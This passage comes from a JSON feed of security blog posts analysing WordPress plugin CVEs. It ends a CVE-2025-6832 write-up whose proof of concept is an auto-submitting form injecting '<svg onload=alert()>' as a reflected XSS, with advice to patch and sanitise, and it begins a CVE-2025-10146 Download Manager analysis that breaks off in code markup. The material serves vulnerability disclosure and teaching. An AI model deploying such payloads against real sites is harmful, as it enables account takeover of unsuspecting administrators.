n\u003e \u003cspan class=\"na\"\u003emethod\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;post\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003einput\u003c/span\u003e \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;hidden\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;action\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;aio_time_clock_lite_js\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003einput\u003c/span\u003e \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;hidden\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;nonce\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u0026lt;svg onload=alert()\u0026gt;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003eform\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eforms\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eSend the link to the page containing the form to a user with privileges.\u003c/li\u003e\n\u003cli\u003eObserve the injected \u003cstrong\u003eJavaScript\u003c/strong\u003e executing.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cfigure\u003e\u003ca class=\"lightgallery\" href=\"/2025-10-07-cve-2025-6832/result.png\" title=\"Result — PoC execution screenshot\" data-thumbnail=\"/2025-10-07-cve-2025-6832/result.png\" data-sub-html=\"\u003ch2\u003eResult — PoC execution screenshot\u003c/h2\u003e\u003cp\u003eResult — PoC execution screenshot\u003c/p\u003e\"\u003e\u003cimg  loading=\"lazy\" src='/2025-10-07-cve-2025-6832/result.png' srcset=\"/2025-10-07-cve-2025-6832/result_hu_d5df3c34f1a1dfbc.webp 800w, /2025-10-07-cve-2025-6832/result_hu_680d54ec509fc0d7.webp 1200w, /2025-10-07-cve-2025-6832/result_hu_655c0c8786f0e9d7.webp 1600w\"  alt=\"Result — PoC execution screenshot\" height=\"1119\" width=\"1920\"\u003e\u003c/a\u003e\u003cfigcaption class=\"image-caption\"\u003eResult — PoC execution screenshot\u003c/figcaption\u003e\n\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"conclusion\" class=\"headerLink\"\u003e\n    \u003ca href=\"#conclusion\" class=\"header-mark\"\u003e\u003c/a\u003e14 Conclusion\u003c/h2\u003e\u003cp\u003eThe \u003cstrong\u003eCVE-2025-6832\u003c/strong\u003e vulnerability in \u003cstrong\u003eAll in One Time Clock Lite \u0026lt;= 2.0\u003c/strong\u003e allows an \u003cstrong\u003eunauthenticated attacker\u003c/strong\u003e to exploit a Reflected XSS via the \u003ccode\u003enonce\u003c/code\u003e parameter. The \u003cstrong\u003e2.0.1\u003c/strong\u003e patch added \u003ccode\u003esanitize_text_field()\u003c/code\u003e to filter input, preventing malicious code from being reflected in the JSON response.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eKey takeaways\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlways \u003cstrong\u003esanitize\u003c/strong\u003e and \u003cstrong\u003eescape\u003c/strong\u003e data before returning it in responses.\u003c/li\u003e\n\u003cli\u003eEndpoints exposed to \u003cstrong\u003enopriv (unauthenticated)\u003c/strong\u003e requests should be carefully reviewed.\u003c/li\u003e\n\u003cli\u003eReflected XSS commonly occurs when input values are directly reflected into output (JSON/HTML).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUpdating the plugin\u003c/strong\u003e promptly is the simplest way to reduce risk.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"references\" class=\"headerLink\"\u003e\n    \u003ca href=\"#references\" class=\"header-mark\"\u003e\u003c/a\u003e15 References\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eCross-site scripting (XSS) cheat sheet — PortSwigger\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://patchstack.com/database/wordpress/plugin/aio-time-clock-lite/vulnerability/wordpress-all-in-one-time-clock-lite-tracking-employee-time-has-never-been-easier-plugin-2-0-reflected-cross-site-scripting-vulnerability\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eWordPress All in One Time Clock Lite \u0026lt;= 2.0 — CVE-2025-6832\u003c/a\u003e\u003c/p\u003e",
        "language": "en"
    },
    {
        "title" : "CVE-2025-10146 Analysis \u0026 POC",
        "date_published" : "2025-10-06T19:18:00+07:00",
        "date_modified" : "2025-10-21T19:11:48+07:00",
        "id" : "http://localhost:1313/2025-10-06-cve-2025-10146/",
        "url" : "http://localhost:1313/2025-10-06-cve-2025-10146/",
        "content_html" : "\u003cp\u003eA vulnerability exists in the \u003cstrong\u003eDownload Manager\u003c/strong\u003e plugin prior to version \u003cstrong\u003e3.3.24\u003c/strong\u003e. Data retrieved from \u003cstrong\u003eGET\u003c/strong\u003e requests is printed directly into \u003cstrong\u003eHTML attributes\u003c/strong\u003e, leading to \u003cstrong\u003ereflected XSS\u003c/strong\u003e when a user with privileges accesses a URL crafted by an attacker.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-10146\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eCVE-2025-10146\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/download-manager\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eWordPress Download Manager Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: Cross Site Scripting\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.3.23\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\" class=\"headerLink\"\u003e\n    \u003ca href=\"#requirements\" class=\"header-mark\"\u003e\u003c/a\u003e11 Requirements\u003c/h2\u003e\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLocal WordPress \u0026amp; Debugging\u003c/strong\u003e: \u003ca href=\"https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eLocal WordPress and Debugging\u003c/a\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDownload Manager\u003c/strong\u003e: v3.3.23(vulnerable) and v3.3.24(fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing differences between two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\" class=\"headerLink\"\u003e\n    \u003ca href=\"#analysis\" class=\"header-mark\"\u003e\u003c/a\u003e12 Analysis\u003c/h2\u003e\u003ch3 id=\"patch-diff\" class=\"headerLink\"\u003e\n    \u003ca href=\"#patch-diff\" class=\"header-mark\"\u003e\u003c/a\u003e12.1 Patch Diff\u003c/h3\u003e\u003cp\u003eUse any diff tool to compare the vulnerable and patched versions. A significant difference appears in \u003cstrong\u003esrc/Admin/views/stats/history.php\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eVulnerable code\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"code-block highlight is-closed show-line-numbers  tw-group tw-my-2\"\u003e\n  \u003cdiv class=\"\n    \n    tw-flex \n    tw-flex-row\n    tw-flex-1 \n    tw-justify-between \n    tw-w-full tw-bg-bgColor-secondary\n    \"\u003e      \n    \u003cbutton \n      class=\"\n        code-block-button\n        tw-mx-2 \n        tw-flex\n        tw-flex-row\n        tw-flex-1\"\n      aria-hidden=\"true\"\u003e\n          \u003cdiv class=\"group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 320 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z\"/\u003e\u003c/svg\u003e\u003c/div\u003e\n          \u003cp class=\"tw-select-none !tw-my-1\"\u003ephp\u003c/p\u003e\n      \u003c/button\u003e\n\n   \u003cdiv class=\"tw-flex\"\u003e\n      \u003cbutton \n        class=\"\n          line-number-button\n          tw-mx-2 \n          tw-hidden \n          group-[.is-open]:tw-block \n          group-[.show-line-numbers]:tw-text-fgColor-link \n          print:!tw-hidden\" \n        title=\"Toggle line numbers\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M61.77 401l17.5-20.15a19.92 19.92 0 0 0 5.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8h22.83a157.41 157.41 0 0 0-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33 0 15.94 2.44 15.94 9.09 0 4.72-4.2 8.22-14.36 8.22a41.54 41.54 0 0 1-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16 0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zm0-160H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16V80a16 16 0 0 0-16-16zm0 320H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zM16 160h64a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H64V40a8 8 0 0 0-8-8H32a8 8 0 0 0-7.14 4.42l-8 16A8 8 0 0 0 24 64h8v64H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8zm-3.91 160H80a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H41.32c3.29-10.29 48.34-18.68 48.34-56.44 0-29.06-25-39.56-44.47-39.56-21.36 0-33.8 10-40.46 18.75-4.37 5.59-3 10.84 2.8 15.37l8.58 6.88c5.61 4.56 11 2.47 16.12-2.44a13.44 13.44 0 0 1 9.46-3.84c3.33 0 9.28 1.56 9.28 8.75C51 248.19 0 257.31 0 304.59v4C0 316 5.08 320 12.09 320z\"/\u003e\u003c/svg\u003e\u003c/button\u0